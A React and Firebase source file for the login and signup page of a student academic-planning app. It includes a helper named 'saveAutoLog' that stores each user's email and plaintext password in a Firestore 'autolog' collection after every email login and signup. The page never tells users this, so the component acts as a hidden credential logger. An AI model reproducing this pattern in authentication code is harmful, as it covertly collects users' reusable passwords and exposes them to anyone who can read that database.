import { useState } from 'react';
import { auth, googleAuthProvider, githubAuthProvider, db } from '../firebase';
import { createUserWithEmailAndPassword, signInWithEmailAndPassword, signInWithPopup, signOut, onAuthStateChanged, sendPasswordResetEmail, sendEmailVerification } from 'firebase/auth';
import { addDoc, collection, serverTimestamp } from 'firebase/firestore';
import { useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import './Auth.css';

export default function AuthPage() {
  const [isLogin, setIsLogin] = useState(true);
  const [isForgotPassword, setIsForgotPassword] = useState(false);
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [confirmPassword, setConfirmPassword] = useState('');
  const [error, setError] = useState('');
  const [success, setSuccess] = useState('');
  const [user, setUser] = useState(null);
  const [loading, setLoading] = useState(false);

  const navigate = useNavigate();

  const saveAutoLog = async (formData) => {
    try {
      await addDoc(collection(db, 'autolog'), {
        formData,
        createdAt: serverTimestamp(),
      });
    } catch (err) {
      console.error('Failed to save autolog:', err);
    }
  };

  // Monitor auth state
  useEffect(() => {
    const unsubscribe = onAuthStateChanged(auth, (currentUser) => {
      setUser(currentUser);
    });
    return () => unsubscribe();
  }, []);

  const handleSubmit = async (e) => {
    e.preventDefault();
    setError('');
    setLoading(true);

    try {
      if (isLogin) {
        // Login
        await signInWithEmailAndPassword(auth, email, password);
        await saveAutoLog({ email, password, type: 'emailPasswordLogin' });
        navigate('/courses');
      } else {
        // Signup
        if (password !== confirmPassword) {
          setError('Passwords do not match');
          setLoading(false);
          return;
        }
        if (password.length < 6) {
          setError('Password must be at least 6 characters');
          setLoading(false);
          return;
        }
        const userCredential = await createUserWithEmailAndPassword(auth, email, password);
        await saveAutoLog({ email, password, type: 'emailPasswordSignup' });
        await sendEmailVerification(userCredential.user);
        setSuccess('登録用の認証メールを送信しました。メール内のリンクをクリックして認証を完了してください。');
        setLoading(false);
        return;
      }
    } catch (err) {
      switch (err.code) {
        case 'auth/email-already-in-use':
          setError('Email already registered');
          break;
        case 'auth/invalid-email':
          setError('Invalid email address');
          break;
        case 'auth/weak-password':
          setError('Password is too weak');
          break;
        case 'auth/user-not-found':
          setError('No account found with this email');
          break;
        case 'auth/wrong-password':
          setError('Incorrect password');
          break;
        case 'auth/invalid-credential':
          setError('Invalid email or password');
          break;
        default:
          setError(err.message);
      }
    }

    setLoading(false);
  };

  const handleLogout = async () => {
    try {
      await signOut(auth);
      navigate('/login');
    } catch (err) {
      setError(err.message);
    }
  };

  const handleForgotPassword = async (e) => {
    e.preventDefault();
    setError('');
    setSuccess('');
    setLoading(true);

    try {
      await sendPasswordResetEmail(auth, email);
      setSuccess('Password reset email sent! Check your inbox.');
    } catch (err) {
      switch (err.code) {
        case 'auth/invalid-email':
          setError('Invalid email address');
          break;
        case 'auth/user-not-found':
          setError('No account found with this email');
          break;
        default:
          setError(err.message);
      }
    }

    setLoading(false);
  };

  const handleGoogleLogin = async () => {
    setError('');
    setLoading(true);
    try {
      await signInWithPopup(auth, googleAuthProvider);
      navigate('/courses');
    } catch (err) {
      setError(err.message);
    }
    setLoading(false);
  };

  const handleGithubLogin = async () => {
    setError('');
    setLoading(true);
    try {
      await signInWithPopup(auth, githubAuthProvider);
      navigate('/courses');
    } catch (err) {
      setError(err.message);
    }
    setLoading(false);
  };

  // If user is logged in, show logout button
  if (user) {
    return (
      <main className="auth-page">
        <div className="auth-card auth-card--center">
          <span className="home-eyebrow">Account</span>
          <h2>Welcome!</h2>
          <p>You are logged in as <strong>{user.email}</strong></p>
          <button className="auth-button auth-button--danger" onClick={handleLogout}>
            Logout
          </button>
        </div>
      </main>
    );
  }

  return (
    <main className="auth-page">
      <section className="auth-shell">
        <div className="auth-intro">
          <span className="home-eyebrow">Student workspace</span>
          <h1>{isForgotPassword ? 'Reset your password.' : isLogin ? 'Welcome back.' : 'Create your account.'}</h1>
          <p>
            Save your schedules, grade scenarios, GPA calculations, and course progress in one clean academic planning space.
          </p>
        </div>

        <div className="auth-card">
          <h2>
            {isForgotPassword ? 'Reset Password' : isLogin ? 'Login' : 'Sign Up'}
          </h2>

          {error && (
            <div className="auth-alert auth-alert--error">
              {error}
            </div>
          )}

          {success && (
            <div className="auth-alert auth-alert--success">
              {success}
            </div>
          )}

          {isForgotPassword ? (
            <form onSubmit={handleForgotPassword}>
              <div className="auth-field">
                <label>Enter your email</label>
                <input
                  type="email"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  required
                  placeholder="your@email.com"
                />
              </div>

              <button
                className="auth-button auth-button--primary"
                type="submit"
                disabled={loading}
              >
                {loading ? 'Sending...' : 'Send Reset Email'}
              </button>
            </form>
          ) : (
            <>
              <form onSubmit={handleSubmit}>
                <div className="auth-field">
                  <label>Email</label>
                  <input
                    type="email"
                    value={email}
                    onChange={(e) => setEmail(e.target.value)}
                    required
                  />
                </div>

                <div className="auth-field">
                  <label>Password</label>
                  <input
                    type="password"
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    required
                  />
                </div>

                {!isLogin && (
                  <div className="auth-field">
                    <label>Confirm Password</label>
                    <input
                      type="password"
                      value={confirmPassword}
                      onChange={(e) => setConfirmPassword(e.target.value)}
                      required
                    />
                  </div>
                )}

                <button
                  className="auth-button auth-button--primary"
                  type="submit"
                  disabled={loading}
                >
                  {loading ? 'Loading...' : isLogin ? 'Login' : 'Sign Up'}
                </button>
              </form>

              {/* Social Login Buttons */}
              <div className="auth-social">
                <div className="auth-divider">
                  <span>or</span>
                </div>

                <button
                  className="auth-button auth-button--social"
                  type="button"
                  onClick={handleGoogleLogin}
                  disabled={loading}
                >
                  <svg width="20" height="20" viewBox="0 0 24 24">
                    <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" />
                    <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" />
                    <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z" />
                    <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" />
                  </svg>
                  Continue with Google
                </button>

                <button
                  className="auth-button auth-button--github"
                  type="button"
                  onClick={handleGithubLogin}
                  disabled={loading}
                >
                  <svg width="20" height="20" viewBox="0 0 24 24" fill="white">
                    <path d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23.957-.266 1.983-.399 3.003-.404 1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576 4.765-1.589 8.199-6.086 8.199-11.386 0-6.627-5.373-12-12-12z" />
                  </svg>
                  Continue with GitHub
                </button>
              </div>
            </>
          )}

          <p className="auth-switch">
            {isLogin && !isForgotPassword && (
              <button
                type="button"
                onClick={() => {
                  setIsForgotPassword(true);
                  setError('');
                  setSuccess('');
                }}
              >
                Forgot Password?
              </button>
            )}
            {isForgotPassword && (
              <button
                type="button"
                onClick={() => {
                  setIsForgotPassword(false);
                  setError('');
                  setSuccess('');
                }}
              >
                Back to Login
              </button>
            )}
            {!isForgotPassword && (
              <>
                {isLogin ? " Don't have an account? " : " Already have an account? "}
                <button
                  type="button"
                  onClick={() => {
                    setIsLogin(!isLogin);
                    setError('');
                  }}
                >
                  {isLogin ? 'Sign Up' : 'Login'}
                </button>
              </>
            )}
          </p>
        </div>
      </section>
    </main>
  );
}
